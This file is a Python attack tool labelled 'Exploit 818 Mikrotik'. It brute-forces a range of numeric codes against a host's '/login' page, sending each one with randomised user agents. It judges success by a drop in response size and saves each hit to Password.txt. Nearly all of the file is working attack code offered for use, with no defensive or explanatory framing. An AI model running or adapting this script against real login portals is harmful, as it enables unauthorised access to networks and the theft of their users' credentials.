#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** (EX-818-M) Exploit 818 Mikrotik ***
# * Version:
#   v1.1
# * Date:
#   19 - 08 - 2019 { Mon 19 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************

import os
import sys
import time
import requests
from re import split as SP
from random import randint
sys.path.append('../modules/')
from tools import agent as _USER_AGENT
from color import *


def write(M, T):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(T / 100)


def cou(word) -> int():
    n = 0
    for i in word:n += 1
    return n


def _PRINT(*args, **kwargs):
    _MSG = args[0].strip()
    return print(args[0])



def URL_CLEAR(*args, **kwargs):
    _RE_ = args[0]
    _RE_ = _RE_.replace("http://","") if 'http' in _RE_ else _RE_
    _RE_ = _RE_.rsplit("/")[0] if "/" in args[0] else _RE_
    return _RE_



def _WRITE_PASSWORD(*args, **kwargs):
    _FILE_ = open(os.path.join(os.getcwd(),'Password.txt'), 'a')  
    _FILE_.write(f"\n{'+'*5} Mr.MHM {'+'*5}\nPASSWORD: {args[0]}\n")
    _FILE_.close()





def _INDEX(*args, **kwargs):
    os.system("clear")
    _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in {os.getcwd()}/Password.txt ^^\n") if int(args[3]) > 0 else ""

    _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
[{B} * {N}] SIZE     : {args[1].headers['Content-Length']} Bytes
[{B} * {N}] URL      : {URL_CLEAR(args[1].url)}
[{B} * {N}] PASSWORD : {args[2]}
[{B} * {N}] TIMEOUT  : {args[1].elapsed.total_seconds()}\n\n\n--- Enter Ctrl+C for (exit) ---""")
    return _PRINT(_P)



def _REQUESTS_SU(*args, **kwargs):
    global _S

    HOST, PASSWIRD = args

    _S = requests.Session()
    _S.headers['User-Agent'] = _USER_AGENT(randint(0,10))

    _DATA = {"username": str(PASSWIRD)}

    try:

        _GET = _S.post(url=f"http://{HOST}/login", data=_DATA)

    except:
        _PRINT(f"[{R} - {N}] Sorry ERROR For Connection !!")
        sys.exit(0)


    return _GET



def _PROCESS_DATA(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args

    ZERO = True if MINNUM.startswith("0") is False else False

    _A = PROCESS_SIZE = FIND = int()
    _R = True

    for PASSWIRD in range(int(MINNUM),int(MAXNUM)):
        PASSWIRD = PASSWIRD if ZERO is True else f"0{PASSWIRD}"
        DATA = _REQUESTS_SU(HOST,PASSWIRD)

        if _R is True:
            PROCESS_SIZE = int(DATA.headers['Content-Length'])
            _R = False

        if int(DATA.headers['Content-Length']) < PROCESS_SIZE and int(DATA.status_code) == 200:
            if  PROCESS_SIZE - int(DATA.headers['Content-Length']) > 500:
                    _S.get(url=f"http://{HOST}/logout")
                    _S.delete(url=f"http://{HOST}/login")                    
                    _WRITE_PASSWORD(PASSWIRD)
                    _R = True
                    FIND += 1

        _INDEX(_A, DATA, PASSWIRD, FIND)

        _A += 1
   


def _SERVER_SYS(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args
    _PROCESS_DATA(URL_CLEAR(HOST), MINNUM, MAXNUM)


class MAIN(object):
    def __init__(self):
        pass

    def run(self, HOST, MINNUM,MAXNUM):
        _SERVER_SYS(HOST, MINNUM, MAXNUM)
